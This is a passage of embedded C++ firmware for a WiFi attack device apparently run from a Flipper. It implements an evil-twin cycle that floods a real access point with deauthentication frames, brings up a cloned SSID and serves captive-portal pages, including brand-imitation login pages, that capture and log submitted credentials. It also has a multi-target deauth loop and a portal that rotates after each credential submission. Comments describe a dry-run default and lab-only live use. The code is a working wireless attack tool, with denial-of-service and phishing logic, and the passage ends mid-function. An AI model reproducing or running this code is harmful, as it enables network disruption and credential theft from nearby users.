#define ET_UP_DEADLINE  15000u   /* hard deadline on AP bring-up / teardown so a stuck SDK call
                                    can't wedge loop() (the original containment bug) */
static volatile int  et_phase = ET_IDLE;
static volatile bool et_live = false;
static uint8_t  et_bssid[6];
static char     et_ssid[33] = {0};
static volatile int et_ch = 6;
static volatile uint32_t et_t = 0;

static bool atStart(int ch = 6, const char* apssid = nullptr, bool portal = false)
{
    if (atState != AT_IDLE &&
        !(atState == AT_FAILED && atClean)) {
        atReply("APTEST:BUSY");
        return false;
    }

    /*
     * This deliberately isolated test build refuses to run while ANY other
     * feature is active: the lifecycle must own the radio alone.
     *
     * EXCEPTION: a non-empty deauth_wifis list is TX-only and stays on the AP's own channel, so it
     * coexists with the AP (that is exactly the EVIL flow: deauth the real AP, host its clone).
     * dauth_run (DEAUTHRUN) is excluded because it retunes the channel round-robin.
     */
    if (hopping || CAP_ON() || hsg_phase != HSG_IDLE || hv_phase != HV_IDLE || wids_on ||
        SNIFF_ON() || et_phase != ET_IDLE ||
        dauth_run ||
        KON_LOAD() || randomSSID || rickroll || ghostSpam ||
        ssid.length() != 0) {
        atReply("APTEST:BUSY");
        return false;
    }

    /*
     * All request data is owned before acceptance.
     * No caller pointers, scan results, or String storage survive here.
     */
    // SSID: a custom name (Create AP) or the fixed test-AP name.
    if (apssid && apssid[0]) {
        size_t n = strlen(apssid); if (n > 32) n = 32;
        memcpy(atSsid, apssid, n); atSsid[n] = 0;
    } else {
        memcpy(atSsid, "PETRELTESTAP", sizeof("PETRELTESTAP"));
    }
    // A real TX channel, else the ch6 default (DFS included: an AP cannot sit on radar channels).
    atChannel = is_valid_tx_channel(ch) ? (uint8_t)ch : 6;
    g_def_cache = default_web(String(atSsid));   // build the Default page outside the tcpip thread
    // Create AP serves the selected captive portal via the raw-lwIP listener; the bare test AP serves
    // the read-only status page via the raw-lwIP WebUI. The Arduino WiFiServer is not used at all, so
    // the "[ERROR] Accept connection failed" flood is gone. Set per start; the next start overwrites
    // these, so NO stop-side clear is needed (clearing them in atStop would break eviltwin's per-cycle
    // AP re-arm).
    web_portal_mode = portal;
    webui_mode = !portal;
    ++atCycle;
    atFailure = 0;
    atOffTries = 0;
    atWantStart = true;
    atStopRequested = false;
    atEnter(AT_CLOSE);
    char m[64]; snprintf(m, sizeof(m), "APTEST:ACCEPTED ssid=%s ch=%d%s",
                         atSsid, atChannel, portal ? " portal" : "");
    atReply(m);
    return true;
}

static void atStop()
{
    if (atState == AT_IDLE) {
        atReply("APTEST:STOPPED");
        return;
    }

    if (atState == AT_FAILED) {
        if (!atClean) {
            atReply("APTEST:RESET_REQUIRED");
            return;
        }
        atFailure = 0;
        atWantStart = false;
        atEnter(AT_IDLE);           // failed cleanup already confirmed off
        atReply("APTEST:STOPPED");
        return;
    }

    atStopRequested = true;
    atReply("APTEST:STOP_ACCEPTED");
}

// --- M3: evil-twin FSM (CLONE <-> DEAUTH, single radio, sequential) ----------------------------
// SSID is DATA into the FSM; bringing the cloned AP on air is a SEPARATELY LIVE-gated side-effect
// (advisor). DEFAULT DRY: cycles phases and logs "would clone/deauth" with the REAL target as data,
// transmitting NOTHING — so the AI verifies the state machine + teardown (where the original
// containment wedge actually lived) without ever cloning a real SSID on air. LIVE (owner-only,
// RF-isolated lab) brings up the clone+portal via the cooperative AP lifecycle and deauths the real
// AP. One idempotent releaseRadio() tears everything down from any state.
// (ET_* constants + state are declared ABOVE atStart so its busy guard can see et_phase.)

// Bring up a cloned AP (target SSID/channel) through the SAME cooperative lifecycle as the test AP,
// but with the real target as input instead of the hardcoded PETRELTESTAP. Caller owns the busy check.
static bool atStartClone(const char* ssid, int ch) {
    if (atState != AT_IDLE && !(atState == AT_FAILED && atClean)) return false;
    size_t n = strlen(ssid); if (n > 32) n = 32;
    memcpy(atSsid, ssid, n); atSsid[n] = 0;
    // 5 GHz raw TX is confirmed on this part (RF ground truth), so the clone AP can come up on the
    // target's own channel: 2.4 (1-14) or non-DFS 5 GHz (36-48 / 149-165). DFS (52-144) can't host
    // an AP, so it is REFUSED loudly rather than silently retuned to ch6 (a silent fallback used to
    // hide the band failure). The deauth leg uses et_ch directly regardless of the clone channel.
    if (is_valid_tx_channel(ch)) {
        atChannel = (uint8_t)ch;
    } else {
        Serial.println("EVILTWIN:clone channel refused (DFS/out-of-range; use 1-14 or 36-48/149-165)");
        Serial1.println("EVILTWIN:clone channel refused (DFS/out-of-range; use 1-14 or 36-48/149-165)");
        return false;
    }
    webui_mode = false;   // eviltwin serves the captive portal, never the WebUI status page (AT_HTTP
                          // checks webui_mode first, so a stale true from a prior APTEST/WEBUI would win)
    build_portal_urls(ssid);   // opt-114 / 302 / cp.json host must match the CLONE ssid, not the last AP
    ++atCycle;
    atFailure = 0;
    atOffTries = 0;
    atWantStart = true;
    atStopRequested = false;
    atEnter(AT_CLOSE);
    return true;
}

// Idempotent teardown: portal/DHCP/SoftAP via the lifecycle, stop any deauth/promisc, reset the AP
// SSID to the safe default, and return the evil-twin FSM to idle. Safe from any state / partial bring-up.
static void releaseRadio(const char* why) {
    if (atOwned()) atStop();                 // cooperative teardown (apTestTick finishes portal->DHCP->AP)
    dauth_run = false; dauth_n = 0;
    wifi_set_promisc(0, NULL, 0);
    memcpy(atSsid, "PETRELTESTAP", sizeof("PETRELTESTAP"));
    et_phase = ET_IDLE;
    et_live = false;
    web_portal_mode = false;                 // stop serving the captive portal via raw-lwIP
    webui_mode = false;                      // ...and the status page, whichever was up
    char m[56]; snprintf(m, sizeof(m), "EVILTWIN:released %s", why ? why : "");
    Serial.println(m); Serial1.println(m);
}

// --- background ticks that must keep running while the AP lifecycle owns the radio -------------
// loop() used to `return` as soon as atOwned() was true, which starved both of these: EVILTWIN LIVE
// could never observe AT_READY (so it never reached its portal dwell or its deadline) and EVIL's
// deauth list never transmitted a single frame.

// M3 evil-twin FSM tick. Non-blocking (returns each pass). DEAUTH and PORTAL are strictly sequential
// (one radio). DRY only cycles + logs "would ..."; LIVE drives the AP lifecycle, with a hard deadline
// on bring-up/teardown so a stuck SDK call cannot wedge loop().
static void eviltwinTick() {
  if (et_phase == ET_IDLE) return;
  uint32_t now = millis();
  if (et_phase == ET_DEAUTH) {
    if (et_live && !is_dfs_channel(et_ch)) {        // AP is down here: burst-deauth the real AP
      wext_set_channel(WLAN0_NAME, et_ch);
      for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
        wifi_tx_deauth_frame(et_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
        delay(5);
      }
    }
    if (now - et_t >= ET_BURST_MS) {
      et_t = now;
      if (et_live) {
        if (atStartClone(et_ssid, et_ch)) et_phase = ET_WAITUP;
        else releaseRadio("clone start refused");
      } else {
        char m[96];
        snprintf(m, sizeof(m), "EVILTWIN:would clone \"%s\" ch%d + portal (dwell %us)",
                 et_ssid, et_ch, (unsigned)(ET_DWELL_MS / 1000u));
        Serial.println(m); Serial1.println(m);
        et_phase = ET_PORTAL;
      }
    }
  } else if (et_phase == ET_WAITUP) {               // LIVE: clone AP coming up
    if (atState == AT_READY) { et_t = now; et_phase = ET_PORTAL; Serial1.println("EVILTWIN:clone up"); }
    else if (now - et_t >= ET_UP_DEADLINE) releaseRadio("AP bring-up timeout");
  } else if (et_phase == ET_PORTAL) {
    if (now - et_t >= ET_DWELL_MS) {
      et_t = now;
      if (et_live) { atStop(); et_phase = ET_WAITDN; }
      else {
        char m[88];
        snprintf(m, sizeof(m), "EVILTWIN:would deauth %02X%02X%02X%02X%02X%02X ch%d (next cycle)",
                 et_bssid[0], et_bssid[1], et_bssid[2], et_bssid[3], et_bssid[4], et_bssid[5], et_ch);
        Serial.println(m); Serial1.println(m);
        et_phase = ET_DEAUTH;
      }
    }
  } else if (et_phase == ET_WAITDN) {               // LIVE: AP tearing down before next deauth
    if (atState == AT_IDLE) { et_t = now; et_phase = ET_DEAUTH; }
    else if (now - et_t >= ET_UP_DEADLINE) releaseRadio("AP teardown timeout");
  }
}

// C: multi-target deauth round-robin (DEAUTH / DEAUTHRUN). `apOwned` = the AP lifecycle holds the
// radio: then only targets sitting on the AP's own channel are sent, WITHOUT retuning (a retune
// would move the AP off its channel). Otherwise every target is retuned to in turn.
static void deauthListTick(bool apOwned) {
  if (deauth_wifis.size() == 0) return;
  // The list can shrink under us (STOP <n>, SCAN, DEAUTHCLEAR), so clamp before dereferencing.
  if (current_num >= deauth_wifis.size()) current_num = 0;
  int idx = deauth_wifis[current_num];
  if (idx < 0 || idx >= (int)scan_results.size()) { current_num = 0; return; }
  int ch = scan_results[idx].channel;
  current_num++;
  if (current_num >= deauth_wifis.size()) current_num = 0;
  if (apOwned && ch != atChannel) return;   // off-channel target: skip, try the next one
  if (is_dfs_channel(ch)) return;           // DFS: RX-only
  memcpy(deauth_bssid, scan_results[idx].bssid, 6);
  if (!apOwned) wext_set_channel(WLAN0_NAME, ch);
  led_w(LED_R, HIGH);
  for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    delay(5);
  }
  led_w(LED_R, LOW);
  delay(50);
}

// M4: render the read-only WebUI status page (live in-RAM state) into b. Reads only; no control.
static void webui_render(char* b, size_t n) {
    snprintf(b, n,
      "<!doctype html><html><head><meta charset=utf-8>"
      "<meta name=viewport content='width=device-width,initial-scale=1'>"
      "<title>Petrel</title><style>body{font-family:sans-serif;margin:1em;background:#111;color:#eee}"
      "h1{font-size:1.2em}table{border-collapse:collapse;width:100%%}"
      "td{padding:4px 8px;border-bottom:1px solid #333}td:first-child{color:#8af}</style></head>"
      "<body><h1>Petrel &mdash; status</h1><table>"
      "<tr><td>free heap</td><td>%lu B</td></tr>"
      "<tr><td>scanned APs</td><td>%u</td></tr>"
      "<tr><td>sniffer</td><td>%s</td></tr>"
      "<tr><td>WIDS</td><td>%s (ch%d, %lu frames)</td></tr>"
      "<tr><td>harvest</td><td>phase %d, %d left</td></tr>"
      "<tr><td>evil-twin</td><td>phase %d (%s)</td></tr>"
      "</table><p style='color:#888'>read-only &middot; Petrel v2</p></body></html>",
      (unsigned long)xPortGetFreeHeapSize(),
      (unsigned)scan_results.size(),
      SNIFF_ON() ? "on" : "off",
      wids_on ? "on" : "off", wids_ch,
      (unsigned long)__atomic_load_n(&g_wids.seen_frames, __ATOMIC_RELAXED),
      hv_phase, hv_targets_left,
      et_phase, et_live ? "LIVE" : "DRY");
}

// Resolve the portal selected via the `portal` global (set by host PORTAL <n> / PORTALHTML), into
// bytes for the raw-lwIP captive-portal listener. Brand pages are gzip blobs in flash (streamed
// zero-copy); Custom is the mutable customPortal buffer (streamed with COPY); Default is built from
// the clone SSID. gzip is detected from the magic.

static void resolve_eviltwin_portal(const char** body, int* len, bool* gzip, bool* copy) {
  const char* b; int l; bool cp = false;
  switch ((enum portals)portal) {
#ifdef PETREL_BRAND_PORTALS   // real-brand pages: private overlay only; else these fall to Default
    // 2026-10-28: served zero-copy. This core gives lwIP a ~7 KB heap (MEM_SIZE) and its malloc
    // failure hook disables interrupts and spins forever, so a COPY of a multi-KB body can kill the
    // board outright. Zero-copy hands lwIP the flash pointer: segments only, no body in the heap.
    // Safe because web_resolve_now() only re-resolves while nothing is streaming (g_sends == 0).
    case Facebook:  b = (const char*)facebook;  l = facebook_len;  break;
    case Amazon:    b = (const char*)amazon;    l = amazon_len;    break;
    case Apple:     b = (const char*)apple;     l = apple_len;     break;
    case Google:    b = (const char*)google;    l = google_len;    break;
    case Microsoft: b = (const char*)microsoft; l = microsoft_len; break;
#endif
    case Custom:    b = customPortal; l = customPortalLen; cp = true; break;   // mutable -> COPY
    case Default:
    default:        // cached at AP start; see g_def_cache
                    if (!g_def_cache) g_def_cache = default_web(String(atSsid));
                    b = g_def_cache; l = (int)strlen(b); cp = true; break;
  }
  *body = b; *len = l; *copy = cp;
  *gzip = (l >= 2 && (uint8_t)b[0] == 0x1f && (uint8_t)b[1] == 0x8b);
}

// Portal rotation (PORTALROT 1): advance to the next page after every credential submit. Runs in the
// tcpip thread, so it only bumps the index - web_lwip re-resolves on the next idle request.
static void portal_rotate_now(void) {
  if (!portal_rot) return;
  if (portal != Custom) portal = (portal + 1) % 6;   // Custom is the operator's own page
}

// customPortal is read by the tcpip thread while a page is being resolved, so every mutation runs
// there too (web_lwip_portal_edit blocks until it has actually been applied).
static uint16_t portalAdded = 0;

static void portal_append_cb(const void* arg) {
  const char* h = (const char*)arg;
  portalAdded = 0;
  for (int i = 0; h && h[i] && h[i+1] && customPortalLen < sizeof(customPortal) - 1; i += 2) {
    int hi = hexnib(h[i]);
    int lo = hexnib(h[i+1]);
    if (hi < 0 || lo < 0) break;
    customPortal[customPortalLen++] = (char)((hi << 4) | lo);
    portalAdded++;
  }
  customPortal[customPortalLen] = 0;
}

static void portal_clear_cb(const void* arg) { (void)arg; customPortalLen = 0; customPortal[0] = 0; }

// `portal` and `portal_rot` are read by the tcpip rotation callback, so the host commands write them
// there too instead of racing it from loop().
static void portal_select_cb(const void* arg) { portal = *(const int*)arg; }
static void portal_read_cb(const void* arg) { *(int*)arg = portal; }   // snapshot for status reads
static void portal_rot_cb(const void* arg) { portal_rot = (*(const int*)arg) != 0; }

static unsigned long portalHash = 0;
static void portal_hash_cb(const void* arg) {
  (void)arg;
  unsigned long h = 2166136261UL;
  for (unsigned int i = 0; i < customPortalLen; i++) { h ^= (uint8_t)customPortal[i]; h *= 16777619UL; }
  portalHash = h;
}

static void apTestTick()
{
    /*
     * Do not interrupt a radio operation between initiation and
     * confirmation. Continue answering commands while it completes.
     */
    if (atStopRequested &&
        atState != AT_OFF_POLL && atState != AT_ON_POLL) {
        atStopRequested = false;
        atWantStart = false;
        atFailure = 0;
        atEnter(AT_CLOSE);
        return;
    }

    int r;
    switch (atState) {
    case AT_IDLE:
    case AT_FAILED:
    case AT_READY:
        return;

    case AT_CLOSE:
        apActive = false;
        web_lwip_stop();   // M4: free the raw-lwIP WebUI/portal listener on teardown
        // NOTE: do NOT clear web_portal_mode here. AT_CLOSE runs mid-bringup too (atStartClone ->
        // AT_CLOSE -> AP_BEGIN -> ... -> AT_HTTP), and the eviltwin FSM cycles the AP up/down, so
        // clearing it here would drop portal mode before AT_HTTP. It is cleared only when eviltwin
        // fully stops (releaseRadio).
        stop_DHCP_Server();
        unbind_dns();
        dhcps_deinit();
        wifi_set_promisc(0, NULL, 0);
        atClean = false;
        atEnter(AT_QUIET);
        return;

    case AT_QUIET:
        if (atExpired(500)) atEnter(AT_OFF_BEGIN);
        return;

    case AT_OFF_BEGIN: {
        const uint32_t began = millis();
        if (!radioSubmit(RADIO_OP_OFF, RTW_MODE_NONE)) {
            // No worker exists, so the radio was never touched: cleanup is safe and retryable. But
            // retrying forever never reached FAILED and never told the host, so cap it.
            if (++atOffTries >= 3) { atTerminalFailure(1); return; }
            atFail(1);
        } else {
            atOffTries = 0;
            atEnter(AT_OFF_POLL);
            atSince = began;   // deadline includes submission time
        }
        return;
    }

    case AT_OFF_POLL:
        // The 20s deadline is a FAILURE deadline: it never interrupts the SDK call. A completion
        // that has not arrived by then is terminal (RESET) - never a retry, never a cleanup.
        if (atExpired(20000)) {
            atTerminalFailure(2);
            return;
        }
        if ((uint32_t)(millis() - atPoll) < 100) return;
        atPoll = millis();
        r = radioPoll(radioJobGen);
        if (r < 0) {
            // The worker REPORTED failure (or observed a live interface): radio state is not
            // proven off, so do not claim a clean shutdown.
            atTerminalFailure(1);
        } else if (r == 1) {
            atClean = true;
            atEnter(AT_OFF_GAP);
        }
        return;   // 0 = pending: loop keeps servicing commands

    case AT_OFF_GAP:
        if (!atExpired(500)) return;
        if (atFailure) {
            atEnter(AT_FAILED);
            char line[48];
            snprintf(line, sizeof(line), "APTEST:FAILED:%u:CLEAN",
                     (unsigned)atFailure);
            atReply(line);
        } else {
            atEnter(AT_ON_BEGIN);
        }
        return;

    case AT_ON_BEGIN: {
        atRadioTarget = atWantStart ? RTW_MODE_AP : RTW_MODE_STA_AP;
        atClean = false;
        const uint32_t began = millis();
        if (!radioSubmit(RADIO_OP_ON, atRadioTarget)) {
            atFail(3);   // no worker exists: cleanup is safe
        } else {
            atEnter(AT_ON_POLL);
            atSince = began;
        }
        return;
    }

    case AT_ON_POLL:
        // UNLIKE a service failure, an ON transition that never completes is TERMINAL (architect):
        // atFail() would run cleanup while the worker may still own the radio.
        if (atExpired(20000)) {
            atTerminalFailure(4);
            return;
        }
        if ((uint32_t)(millis() - atPoll) < 100) return;
        atPoll = millis();
        r = radioPoll(radioJobGen);
        if (r < 0) {
            atFail(3);   // the worker has finished its radio access: cleanup is safe
        } else if (r == 1) {
            petrel_radio_cache(atRadioTarget);   // only after a CONFIRMED ON
            // 2026-10-28: raise the SoftAP station table once the radio is confirmed up (calling it
            // before wifi_on returns ioctl -1 and aborts bring-up). Reconnects were rejected after
            // the first client session left; the table is where that state lives.
            if(atWantStart) {
                extern int wext_set_sta_num(unsigned char ap_sta_num);
                int sn = wext_set_sta_num(8);
                if(sn != 0) { char sm[40]; snprintf(sm, sizeof(sm), "APTEST:STANUM rc=%d", sn); Serial.println(sm); }
            }
            atEnter(AT_ON_GAP);
        }
        return;

    case AT_ON_GAP:
        if (!atExpired(500)) return;
        if (atWantStart) {
            atEnter(AT_AP_BEGIN);
        } else {
            status = WL_IDLE_STATUS;
            atEnter(AT_IDLE);
            atReply("APTEST:STOPPED");
        }
        return;

    case AT_AP_BEGIN: {
        const uint32_t began = millis();
        r = petrel_ap_begin(atSsid, atChannel);  // exactly ONE initiation; returns raw wifi_start_ap rc
        if (r < 0) {
            // surface the band/driver refusal (esp. for 5 GHz) instead of a bare FAILED:5
            char m[48]; snprintf(m, sizeof(m), "APTEST:AP_BEGIN rc=%d ch=%d", r, atChannel);
            Serial.println(m); Serial1.println(m);
            atFail(5);
        } else {
            atEnter(AT_AP_POLL);
            atSince = began;
        }
        return;
    }

    case AT_AP_POLL:
        if (atExpired(20000)) {
            atFail(6);
            return;
        }
        if ((uint32_t)(millis() - atPoll) < 100) return;
        atPoll = millis();
        r = petrel_ap_poll(atSsid, atChannel);
        if (r < 0) atFail(5);
        else if (r == 1) atEnter(AT_DHCP);
        return;

    case AT_DHCP:
        if (!start_DHCP_Server(cpUri, 0))   // derived from the AP SSID, same host as the 302/cp.json
            atFail(7);
        else
            atEnter(AT_DNS);
        return;

    case AT_DNS:
        if (!start_DNS_Server()) atFail(8);
        else atEnter(AT_HTTP);
        return;

    case AT_HTTP:
        // M4: the page is served over a raw-lwIP TCP listener (the Arduino WiFiServer never receives
        // the AP's connections), so nothing else binds :80.
        if (webui_mode) {
            if (!web_lwip_start(webui_render)) { atFail(9); return; }
        } else {
            // Captive portal (Create AP / evil-twin clone): same raw-lwIP listener, serving the
            // SELECTED portal page (Default/brand/Custom per the `portal` global) + OS-probe
            // redirects, and capturing submitted credentials.
            // The listener resolves the page per request (see web_lwip.h), so rotation never swaps
            // a buffer out from under an in-flight send.
            web_lwip_set_resolver(resolve_eviltwin_portal);
            web_lwip_set_rotate(portal_rotate_now);
            if (!web_lwip_start_portal()) { atFail(9); return; }
        }
        status = WL_CONNECTED;
        apActive = true;             // confirmation AND all services succeeded
        atEnter(AT_READY);
        char rm[56]; snprintf(rm, sizeof(rm), "APTEST:READY:%s:%d", atSsid, atChannel);
        atReply(rm);   // actual SSID + channel (Create AP uses a custom SSID / 5 GHz channel)
        return;
    }
}

/* Legacy callers (EVIL, DEAUTH) now drive the cooperative lifecycle instead of the old synchronous
 * createAP(): the AP comes up through atStart() so loop() stays responsive, and the portal is served
 * by the raw-lwIP listener. `ch` is the target channel as a decimal string. Returns false if the
 * lifecycle refused (busy). */
bool createAP(char *ssid, char *ch, char *)
{
    // No side effects before atStart(): it sets webui_mode itself and the caller publishes the
    // portal URLs only once the request was accepted.
    return atStart(atoi(ch), ssid, /*portal=*/true);
}

bool createAP(char *ssid, char *ch)
{
    return createAP(ssid, ch, nullptr);
}

void destroyAP()
{
    if (atOwned()) atStop();
}

void loop() {
  // DIAG (2026-10-28): the board hard-locks while serving a portal page. Codex's leading theory is
  // tcpip-task stack exhaustion hitting this core's fatal overflow hook (which spins forever). The
  // hook lives in a prebuilt archive, so measure the task instead: print its stack high-water mark
  // and the FreeRTOS heap once a second. The last line before a lock shows the trend.
  {
    static uint32_t diag_ms = 0;
    if((uint32_t)(millis() - diag_ms) >= 1000u) {
      diag_ms = millis();
      char db[112];
      web_lwip_diag_tick();
      { extern volatile unsigned g_dns_stage, g_dhcp_stage, g_dns_sz;
      snprintf(db, sizeof(db), "DIAG h=%u s=%u n=%u t=%u p=%u b=%u d=%u hc=%u z=%u q=%u lx=%u ln=%u",
               (unsigned)xPortGetFreeHeapSize(), web_lwip_stage(), web_lwip_reqs(), web_lwip_ticks(),
               (unsigned)g_sp_min, (unsigned)g_sp_base,
               (unsigned)g_dns_stage, (unsigned)g_dhcp_stage, (unsigned)g_dns_sz,
               web_lwip_pcb_state(), (unsigned)link_rx_bytes, (unsigned)link_lines); }
      Serial.println(db);
    }
  }
  framer_drain();   // M0.2: flush any queued sniff frames to CH340 first (lowest latency)
  if (wids_on) wids_drain();   // M3: emit queued WIDS alerts (cb cannot touch Serial)
  if (web_portal_mode) {   // drain captive-portal credentials captured in the lwIP recv thread
    char ev[128];
    while (web_lwip_poll_creds(ev, sizeof(ev))) { Serial.print("EV:"); Serial.println(ev);
                                                  Serial1.print("EV:"); Serial1.println(ev); }
    static unsigned ev_drop = 0;
    unsigned d = web_lwip_creds_dropped();
    if (d != ev_drop) {   // a submission lost to a full queue must be visible
      ev_drop = d;
      Serial.print("EV:dropped "); Serial.println(d);
      Serial1.print("EV:dropped "); Serial1.println(d);
    }
  }
  {   // drain the lwIP-thread log (DHCP/DNS): the tcpip thread must not write the UART itself
    char ll[96];
    while (lwip_log_poll(ll, sizeof(ll))) { Serial.println(ll); Serial1.println(ll); }
    static unsigned last_drop = 0;
    unsigned d = lwip_log_dropped();
    if (d != last_drop) {   // an overrun must be visible, not silent
      last_drop = d;
      Serial.print("LWIPLOG:dropped "); Serial.println(d);
      Serial1.print("LWIPLOG:dropped "); Serial1.println(d);
    }
  }
  // Drain each UART fast (no per-char delay) so long chunked lines aren't dropped, into its OWN
  // buffer.
  // SELF-HEAL (2026-10-28): the Flipper supplies the 5V, and a Flipper reboot glitches the UART
  // lines badly enough that this board's Serial1 RX stops delivering bytes until the peripheral is
  // re-armed — the host then sees a board that never answers IDENT or SCAN:OK, and only a board
  // reset fixes it. Re-arm Serial1 after a long quiet period; an in-flight line is never torn down
  // because the re-init only runs when nothing has arrived for LINK_QUIET_MS.
  bool got_rx = false;
  while (Serial1.available()) { cmdFlip += (char)Serial1.read(); link_rx_bytes++; got_rx = true; }
  while (Serial.available())   { cmdUsb  += (char)Serial.read(); got_rx = true; }
  {
    static uint32_t last_seen_line = 0;
    static uint32_t link_last_ok = 0;
    static bool link_rearmed = false;
    uint32_t nowm = millis();
    // 2026-10-29: key off a PARSED line, not raw bytes. A wedged UART can deliver spurious bytes
    // forever, which used to reset this timer and keep the port dead. A line the parser accepted is
    // the only proof the link really works. link_rearmed must clear again when a new line arrives,
    // or the board would heal only once per boot.
    if(link_last_line != last_seen_line) {
      last_seen_line = link_last_line;
      link_last_ok = nowm;
      link_rearmed = false;
    }
    if(!link_rearmed && (nowm - link_last_ok) > 10000u) {
      // Nothing has arrived for 10 s: any bytes still sitting in the buffers are leftovers from
      // before the glitch (a real host line arrives in one go), and leaving them there poisons the
      // next command parse — the first newline would hand the chain "garbage+SCAN" and match
      // nothing. Re-arm the peripheral AND drop the stale bytes.
      link_rearmed = true;
      Serial1.end();
      Serial1.begin(BAUD);
      cmdFlip = "";
      cmdUsb = "";
      Serial.println("LINK:Serial1 re-armed after idle");
    }
  }
  // Process EVERY complete line, in order, from both sources (USB first: the out-of-band control
  // channel). The old code ran the chain only when the whole accumulated buffer ended in '\n' and
  // then cleared all of it, so two commands delivered in the same loop() pass silently lost the
  // second one - which is also why the FAP had to sleep 200 ms between state commands (see
  // info_wifi_scene_on_enter) and why a CHANNEL could appear to be ignored. Each line is handed to
  // the chain WITH its trailing '\n', which is exactly what its length()-1 parsers expect, so the
  // chain itself is unchanged.
  for(int src = 0; src < 2; src++) {
    String& buf = (src == 0) ? cmdUsb : cmdFlip;
    while(true) {
      int nl = buf.indexOf('\n');
      if(nl < 0) break;
      if(nl > CMD_LINE_MAX) { buf.remove(0, nl + 1); continue; }  // absurd line: drop it whole
      // Copy the line out, then drop exactly those bytes from the buffer. remove() replaces the
      // old substring-and-reassign dance: it needs no second String for the remainder (which was
      // an unchecked allocation that could silently lose the rest of the buffer) and it does not
      // re-copy the shrinking suffix once per line.
      readString = buf.substring(0, nl + 1);   // one line, trailing '\n' included
      link_last_line = millis();               // a real line arrived (self-heal uses this, not raw bytes)
      link_lines++;
      buf.remove(0, nl + 1);
    {
        // D.4/2 command gate (architect): the lifecycle owns the radio while it runs.
        String command = readString;
        command.trim();

        if (command == "APTEST START" || command.startsWith("APTEST START ")) {
            // optional channel: "APTEST START [ch]" (default 6). Lets the test AP come up on a
            // non-DFS 5 GHz channel so SoftAP 5 GHz can be verified without any deauth/3rd-party TX.
            String rest = command.substring(12); rest.trim();
            atStart(rest.length() ? rest.toInt() : 6);
            readString = "";
            continue;
        }

        if (command == "APTEST STOP") {
            atStop();
            readString = "";
            continue;
        }

        if (command == "APTEST STATUS") {
            char line[64];
            snprintf(line, sizeof(line), "APTEST:STATE:%u:%lu:%u",
                     (unsigned)atState, (unsigned long)atCycle,
                     (unsigned)atFailure);
            atReply(line);
            readString = "";
            continue;
        }

        // M0.2: while a binary sniff stream is armed, the CH340 bulk channel carries ONLY
        // DP_FRAME. Honour just SNIFF STOP / PING; refuse everything else and reply on Serial1
        // (control) so no ASCII ever lands on the stream the host is decoding.
        if (SNIFF_ON() && command != "SNIFF STOP" && command != "PING" && !command.startsWith("STOP")) {
            // Control channel only: the bulk channel is carrying DP_FRAME binary right now.
            Serial1.println("ERROR:SNIFF owns radio");
            readString = "";
            continue;
        }

        // M2: while the autonomous harvest owns the radio, honour only HARVEST */PING; other radio
        // commands would collide (single radio). Reply on Serial1 (control) only.
        if (hv_phase != HV_IDLE && !command.startsWith("HARVEST") && command != "PING" &&
            !command.startsWith("STOP")) {
            atReply("ERROR:HARVEST owns radio");
            readString = "";
            continue;
        }

        // M3: while WIDS monitors (listen-only), only WIDS */PING are honoured (single radio).
        if (wids_on && !command.startsWith("WIDS") && command != "PING" && !command.startsWith("STOP")) {
            atReply("ERROR:WIDS owns radio");
            readString = "";
            continue;
        }

        // M3: while the evil-twin FSM runs, only EVILTWIN */PING are honoured (single radio).
        if (et_phase != ET_IDLE && !command.startsWith("EVILTWIN") && command != "PING" &&
            !command.startsWith("STOP")) {
            atReply("ERROR:EVILTWIN owns radio");
            readString = "";
            continue;
        }

        // Capture, a grab and KARMA own the receiver just like the lifecycle does. Only the CURRENT
        // owner's own commands (plus STOP/PING) may pass: letting any owner's commands through
        // meant CAPTURE could replace an active grab's callback while its FSM kept running.
        {
            bool capOwn = CAP_ON(), grabOwn = (hsg_phase != HSG_IDLE), karmaOwn = KON_LOAD();
            if ((capOwn || grabOwn || karmaOwn) && command != "PING" && !command.startsWith("STOP")) {
                bool mine = (capOwn && (command.startsWith("CAPTURE") || command.startsWith("CAPSTOP")))
                         || (grabOwn && (command.startsWith("HSGRAB") || command.startsWith("PKGRAB") ||
                                         command.startsWith("PMKID")))
                         || (karmaOwn && (command.startsWith("KARMA") || command.startsWith("TRAP")));
                if (!mine) {
                    atReply("ERROR:CAPTURE owns radio");
                    readString = "";
                    continue;
                }
            }
        }

        /*
         * Exclusive radio ownership. Prevent SCAN, STOP, CHANNEL and
         * other legacy commands from modifying a transition in progress.
         */
        if (atOwned() && command != "PING" && !command.startsWith("STOP") &&
            !command.startsWith("EVIL") && !command.startsWith("WEBUI")) {   // WEBUI STOP must pass
            atReply("ERROR:APTEST owns radio");
            readString = "";
            continue;
        }

        // F5: record only commands that survived the gate, so a rejected command is not replayed
        // from the macro (rec_note filters the recorder's own commands internally).
        rec_note(readString);
    }
    if(readString.substring(0,4)=="SCAN"){
      if(apActive)
        destroyAP();
      deauth_wifis.clear();
      current_num = 0;
      DEBUG_SER_PRINT("Stop randomSSID\n");
      randomSSID = false;
      rickroll=false;
      ssid="";

      // BOUNDED retry. This used to loop until a scan SUCCEEDED (scanNetworks() returns 1 on
      // failure), so a wedged radio - or a scan attempted while the softAP is up - meant the board
      // never returned to loop(): no commands, no TX, and nothing but a power cycle to recover.
      // Try twice, then answer anyway and let the host see an empty/partial list.
      int scan_tries = 0;
      while (scanNetworks(5000) && ++scan_tries < 2) {
        delay(1000);
      }
      // SCAN:OK used to be printed unconditionally, even when both attempts failed - the host then
      // waited for a LIST that had nothing in it and showed an empty result list with no
      // explanation. Say what actually happened instead.
      if(scan_tries >= 2) {
        DEBUG_SER_PRINT("SCAN: FAILED after 2 tries");
        Serial1.print("SCAN:FAIL\n");
        Serial.print("SCAN:FAIL\n");
      } else {
        Serial1.print("SCAN:OK\n");
        Serial.print("SCAN:OK\n");
      }
      
    }else if(readString.substring(0,4)=="STOP"){
      DEBUG_SER_PRINT("Stop deauthing\n");
      if (et_phase != ET_IDLE) releaseRadio("by STOP");   // bare STOP also ends the evil-twin cycle
      dauth_run = false;   // C: also disarm the multi-target deauth list
      dauth_n = 0;
      hopping = false;     // STOP used to leave the hop tick retuning the radio
      // An active grab is NOT cap_active, so it needs its own check: abandoning the FSM without
      // stopping promisc left the callback running and the capture armed.
